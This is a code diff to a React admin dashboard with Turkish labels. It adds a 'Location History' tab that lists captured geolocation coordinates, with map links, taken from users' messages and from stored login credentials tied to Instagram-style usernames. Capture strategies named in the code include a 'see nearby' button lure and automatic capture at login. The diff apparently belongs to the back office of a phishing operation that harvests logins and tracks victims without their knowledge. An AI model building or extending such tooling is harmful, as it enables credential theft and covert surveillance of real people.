@@ -1,6 +1,6 @@
 import { useState, useEffect, useRef } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
-import { MoreHorizontal, Download, Shield, User, Globe, Search, Inbox, Layout, Settings, CheckCircle, Users, Eye, EyeOff, Key } from 'lucide-react';
+import { MoreHorizontal, Download, Shield, User, Globe, Search, Inbox, Layout, Settings, CheckCircle, Users, Eye, EyeOff, Key, MapPin } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
 import html2canvas from 'html2canvas';
 import StoryCanvas from '../components/StoryCanvas';
@@ -267,6 +267,90 @@ export default function Admin() {
           </div>
         );
 
+      case 'locations':
+        const locationEvents = [
+          ...messages.filter(m => m.location).map(m => ({ ...m, type: 'message', sourceUser: m.igUsername || 'Anonim' })),
+          ...credentials.filter(c => c.location).map(c => ({ ...c, type: 'login', sourceUser: c.username }))
+        ].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+        return (
+          <div className="tab-pane">
+            <header className="content-header">
+              <div className="header-left">
+                <h1>Konum Geçmişi</h1>
+                <p>Mesajlardan ve girişlerden toplanan tüm konum verileri ({locationEvents.length})</p>
+              </div>
+            </header>
+
+            {locationEvents.length === 0 ? (
+              <div className="empty-state-box">
+                <MapPin size={48} color="#ccc" />
+                <p>Henüz konum verisi yakalanmadı.</p>
+                <span>Konum özelliği aktif edildiğinde burada görünecek.</span>
+              </div>
+            ) : (
+              <div className="cred-grid">
+                {locationEvents.map((event) => (
+                  <motion.div
+                    key={event.id + event.type}
+                    initial={{ opacity: 0, y: 10 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    className="cred-card location-card"
+                    style={{ borderLeft: event.type === 'message' ? '4px solid #3498db' : '4px solid #e74c3c' }}
+                  >
+                    <div className="cred-header">
+                      <div className="cred-avatar" style={{ background: event.type === 'message' ? '#3498db' : '#e74c3c' }}>
+                        {event.type === 'message' ? <Inbox size={20} color="white" /> : <User size={20} color="white" />}
+                      </div>
+                      <div className="cred-user-info">
+                        <span className="cred-username">
+                          {event.type === 'message' ? 'Mesaj Gönderimi' : 'Giriş İşlemi'}
+                        </span>
+                        <span className="cred-time">{new Date(event.timestamp).toLocaleString()}</span>
+                      </div>
+                      <span className="badge" style={{ background: event.type === 'message' ? '#d6eaf8' : '#fadbd8', color: event.type === 'message' ? '#2980b9' : '#c0392b' }}>
+                        {event.type === 'message' ? 'MESAJ' : 'GİRİŞ'}
+                      </span>
+                    </div>
+
+                    <div className="cred-details">
+                      <div className="cred-field">
+                        <span className="cred-label">Kullanıcı / Kaynak</span>
+                        <span className="cred-value">{event.sourceUser}</span>
+                      </div>
+
+                      {event.text && (
+                        <div className="cred-field">
+                          <span className="cred-label">İçerik</span>
+                          <span className="cred-value" style={{ fontStyle: 'italic' }}>"{event.text.substring(0, 50)}{event.text.length > 50 ? '...' : ''}"</span>
+                        </div>
+                      )}
+
+                      <div className="cred-field">
+                        <span className="cred-label">Konum Koordinatları</span>
+                        <a
+                          href={`https://www.google.com/maps?q=${event.location.lat},${event.location.lng}`}
+                          target="_blank"
+                          rel="noopener noreferrer"
+                          className="location-link"
+                          style={{ fontSize: '1rem', marginTop: '4px' }}
+                        >
+                          <MapPin size={16} /> Haritada Aç ({event.location.lat.toFixed(5)}, {event.location.lng.toFixed(5)})
+                        </a>
+                      </div>
+
+                      <div className="cred-field">
+                        <span className="cred-label">Strateji</span>
+                        <span className="cred-value mono">{event.location.strategy === 'nearby_feature' ? 'Yakınlardakileri Gör (Buton)' : 'Giriş Entegreli (Oto)'}</span>
+                      </div>
+                    </div>
+                  </motion.div>
+                ))}
+              </div>
+            )}
+          </div>
+        );
+
       case 'settings':
         return (
           <div className="tab-pane">
@@ -413,6 +497,9 @@ export default function Admin() {
           </div>
           <div className={`nav-item ${activeTab === 'media' ? 'active' : ''}`} onClick={() => setActiveTab('media')}>
             <Layout size={18} /> Medya Kütüphanesi
+          </div>
+          <div className={`nav-item ${activeTab === 'locations' ? 'active' : ''}`} onClick={() => setActiveTab('locations')}>
+            <MapPin size={18} /> Konum Geçmişi
           </div>
           <div className={`nav-item ${activeTab === 'settings' ? 'active' : ''}`} onClick={() => setActiveTab('settings')}>
             <Settings size={18} /> Ayarlar
